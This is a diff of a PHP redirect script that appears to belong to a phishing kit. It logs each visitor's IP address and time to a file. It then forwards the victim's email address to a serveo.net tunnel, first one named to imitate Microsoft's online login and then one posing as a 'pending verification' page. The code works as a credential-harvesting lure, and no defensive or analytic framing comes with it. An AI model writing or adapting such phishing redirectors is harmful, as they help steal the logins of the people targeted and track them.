@@ -20,8 +20,8 @@ $file = fopen("ip.txt","a");
 fwrite($file,$ipaddress."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n"); 
 
 
- $site = "https://microsoftonline.serveo.net/common/oauth2/authorize";
+ $site = "https://pendingverification.serveo.net/go";
  $email = $_GET['var'];
-  header("Location: ".$site."/pass.php?email=".$email."");
+  header("Location: ".$site."/index.php?email=".$email."");
   exit;
 ?>
